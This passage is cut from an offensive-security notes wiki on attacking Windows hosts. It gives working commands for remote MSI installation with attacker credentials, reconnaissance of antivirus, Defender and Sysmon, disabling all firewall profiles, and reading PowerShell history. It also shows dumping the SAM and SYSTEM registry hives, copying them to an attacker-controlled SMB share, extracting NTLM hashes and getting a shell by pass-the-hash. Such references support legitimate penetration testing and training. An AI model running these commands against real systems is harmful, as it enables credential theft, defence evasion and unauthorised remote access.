<p></p><blockquote class="transclude" data-url="how-to-remotely-install-a-windows-package-with-wmic" data-block data-embed-alias="undefined"><h1>How to remotely install a Windows package with wmic</h1><figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">wmic.exe</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">user:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_USER</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">         /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">password:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_PASSWORD</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">         /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">node:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">    product call install PackageLocation</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_ATTACKER_MSI</span></span></code></pre></figure><a href="../spellbook/wmic/../../spells/how-to-remotely-install-a-windows-package-with-wmic" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/wmic" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="powershell">PowerShell<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#powershell" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-reconnaissance-with-powershell" data-block data-embed-alias="undefined"><h1>Windows reconnaissance with PowerShell</h1><p>There are <em>a lot</em> of <a href="../spellbook/windows-reconnaissance-with-powershell/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> commands that can be used for enumerating <a href="../spellbook/windows-reconnaissance-with-powershell/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># List all AD users (IFF the machine is joined to a domain!)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-ADUser</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Filter </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">*</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># List AD users within a particular LDAP subtree</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-ADUser</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Filter </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">*</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">SearchBase </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">CN=Users,DC=example,DC=com</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Enumerate antivirus</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-CimInstance</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Namespace root</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">SecurityCenter2 </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">ClassName AntivirusProduct</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Check if the Windows Defender service is running</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-Service</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> WinDefend</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Check if real-time protection is enabled for Windows</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Defender</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-MpComputerStatus</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> |</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> select RealTimeProtectionEnabled</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Get information about potential threats recently detected by</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Windows Defender</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-MpThreat</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Check the status of the Windows Firewall</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-NetFirewallProfile</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> |</span><span style="--shiki-light:#998418;--shiki-dark:#998418;"> Format-Table</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> Name</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Enabled</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Disable all WIndows Firewall profiles</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Set-NetFirewallProfile</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Profile Domain</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Public</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Private </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                       -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Enabled False</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># List Windows Firewall rules</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-NetFirewallRule</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> |</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> select DisplayName</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Enabled</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Description</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Two ways to check if a port can be connected to (the first</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># provides more output, while the second is more suitable for</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># scripting)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Test-NetConnection</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">ComputerName </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">IP_OR_HOSTNAME</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Port </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PORT</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">New-Object</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> System.Net.Sockets.TcpClient</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">IP_OR_HOSTNAME</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">PORT</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">))</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">.Connected</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># List all current Windows logs</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-EventLog</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">List</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Sysmon is dangerous for an attacker! Three ways to check if</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># it's running...</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-Process</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> |</span><span style="--shiki-light:#998418;--shiki-dark:#998418;"> Where-Object</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> {</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> $</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">_</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">.ProcessName</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> -eq</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">Sysmon</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> }</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-CimInstance</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> win32_service </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">	-</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Filter </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">Description = 'System Monitor service'</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-Service</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> |</span><span style="--shiki-light:#998418;--shiki-dark:#998418;"> where-object</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> {$</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">_</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">.DisplayName</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> -like</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">sysm</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">}</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># List hidden directories</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-ChildItem</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">Hidden</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Path </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">SOME_PATH</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Get a process with a particular &quot;image name&quot; (generally example.exe has an image name of &quot;example&quot;)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Get-Process</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Name </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">IMAGE_NAME</span></span></code></pre></figure>
<p>When checking to see if Sysmon is running, you can also examine the <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon\Operational</code> Registry entry.</p>
<h1 id="powershell-command-history">PowerShell Command History<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#powershell-command-history" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<p></p><blockquote class="transclude" data-url="powershell-history-file" data-block data-embed-alias="undefined"><h1>PowerShell history file</h1><p>View <a href="../spells/powershell-history-file/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a>’s history.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">type </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">Env:</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">USERPROFILE</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span></span></code></pre></figure>
<p>Use %USERPROFILE% instead of <code>$Env:USERPROFILE</code> if running from cmd.exe.</p><a href="../spellbook/windows-reconnaissance-with-powershell/../../spells/powershell-history-file" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/windows-reconnaissance-with-powershell" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="useful-scripts">Useful scripts<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#useful-scripts" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="useful-scripts-for-windows-reconnaissance" data-block data-embed-alias="undefined"><h1>Useful scripts for Windows reconnaissance</h1><ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" class="external" target="_blank">WinPEAS<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" class="external" target="_blank">PowerUp<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" class="external" target="_blank">Windows Exploit Suggester<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
<li><a href="../spellbook/useful-scripts-for-windows-reconnaissance/../../spellbook/metasploit" class="internal alias" data-slug="spellbook/metasploit">Metasploit</a></li>
</ul>
<h2 id="notes">Notes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#notes" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<ul>
<li>WinPEAS is detected and quarantined by Microsoft Defender (service windefend) by default.</li>
<li>PowerUp may require an unrestricted <a href="../spellbook/useful-scripts-for-windows-reconnaissance/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> session (<code>powershell -nop -exec bypass</code>), which can raise alerts.</li>
<li>Windows Exploit Suggester analyzes the output of <a href="../spellbook/useful-scripts-for-windows-reconnaissance/../../spells/systeminfo" class="internal" data-slug="spells/systeminfo">systeminfo</a>, and can be run on the attacker’s machine.</li>
<li>The <code>multi/recon/local_exploit_suggester</code> module works through <a href="../spellbook/useful-scripts-for-windows-reconnaissance/../../spellbook/meterpreter" class="internal" data-slug="spellbook/meterpreter">meterpreter</a> to analyze a <a href="../spellbook/useful-scripts-for-windows-reconnaissance/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> system for potential vulnerabilities.</li>
</ul><a href="../spellbook/useful-scripts-for-windows-reconnaissance" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="exploitation">Exploitation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#exploitation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="permissions-2">Permissions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#permissions-2" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="admin-like-windows-permissions" data-block data-embed-alias="undefined"><h1>Admin-like Windows permissions</h1><h2 id="sebackup--serestore">SeBackup / SeRestore<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#sebackup--serestore" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="windows-sebackup-and-serestore-permissions" data-block data-embed-alias="undefined"><h1>Windows SeBackup and SeRestore permissions</h1><p>These permission allow full read (SeBackup) and write (SeRestore) access to any file. The first of these allows for exfiltration, while the second allows binaries to be replaced at will (combine with service- or task-based attacks!). The “Backup Operators” group has <em>both</em> of these permissions!</p>
<p>Backup useful registry hives:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">reg save HKLM\SYSTEM </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_HIVE_FILE</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">reg save HKLM\SAM </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_HIVE_FILE</span></span></code></pre></figure>
<p>Run a local <a href="../spells/windows-sebackup-and-serestore-permissions/../../spellbook/cifs" class="internal alias" data-slug="spellbook/cifs">SMB</a> server with <a href="../spells/windows-sebackup-and-serestore-permissions/../../spellbook/impacket" class="internal alias" data-slug="spellbook/impacket">Impacket</a>:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="vitesse-light vitesse-light"><code data-language="bash" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">impacket-smbserver</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -smb2support</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -username</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $CONNECTION_USER</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> \</span></span>
<span data-line><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;">	-password</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $CONNECTION_PASSWORD</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $SHARE_NAME</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $PATH_TO_DIRECTORY</span></span></code></pre></figure>
<p>Then, just use copy on <a href="../spells/windows-sebackup-and-serestore-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">copy </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">FILE</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> \\</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ATTACKER_IP</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">\</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">SHARE_NAME</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">\</span></span></code></pre></figure>
<p>Use <a href="../spells/windows-sebackup-and-serestore-permissions/../../spellbook/impacket" class="internal alias" data-slug="spellbook/impacket">Impacket</a> to dump hashes from a hive and perform a pass-the-hash attack:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="vitesse-light vitesse-light"><code data-language="bash" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Get hashes from SAM/SYSTEM hives</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">impacket-secretsdump</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -sam</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $SAM_HIVE_FILE</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> \</span></span>
<span data-line><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;">	-system</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $SYSTEM_HIVE_FILE</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;"> LOCAL</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Get a shell by passing a hash</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">impacket-psexec</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -hashes</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $FULL_NTLM_HASH</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $TARGET_USER</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">@</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">$TARGET_IP</span></span></code></pre></figure><a href="../spellbook/admin-like-windows-permissions/../../spells/windows-sebackup-and-serestore-permissions" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="setakeownership">SeTakeOwnership<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#setakeownership" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="windows-setakeownership-permission" data-block data-embed-alias="undefined"><h1>Windows SeTakeOwnership permission</h1><p>This permission allows a user to take ownership of any file or object (!!!).</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Take ownership of a file</span></span>
